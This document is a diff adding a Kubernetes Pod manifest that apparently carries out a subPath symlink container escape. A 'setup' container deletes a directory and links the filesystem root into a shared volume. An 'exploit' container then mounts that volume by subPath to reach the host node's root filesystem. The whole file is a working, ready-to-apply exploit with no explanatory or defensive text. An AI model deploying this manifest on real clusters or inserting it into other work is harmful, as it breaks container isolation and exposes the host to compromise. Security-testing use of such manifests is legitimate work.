@@ -1,0 +1,32 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: subpath
+spec:
+  containers:
+  - image: nginx:latest
+    name: setup
+    imagePullPolicy: "Always"
+    command: ["/bin/bash"]
+    args: ["-c", "cd /rootfs && rm -rf hostetc && ln -s / /rootfs/host && touch /status/done && sleep infinity"]
+    volumeMounts:
+    - mountPath: /rootfs
+      name: escape-volume
+    - mountPath: /status
+      name: status-volume
+  - image: nginx:latest
+    name: exploit
+    imagePullPolicy: "Always"
+    command: ["/bin/bash"]
+    args: ["-c", "if [[ -f /status/done ]];then sleep infinity; else sleep 1; fi"]
+    volumeMounts:
+    - mountPath: /rootfs
+      name: escape-volume
+      subPath: host
+    - mountPath: /status
+      name: status-volume
+  volumes:
+  - name: escape-volume
+    emptyDir: {}
+  - name: status-volume
+    emptyDir: {}
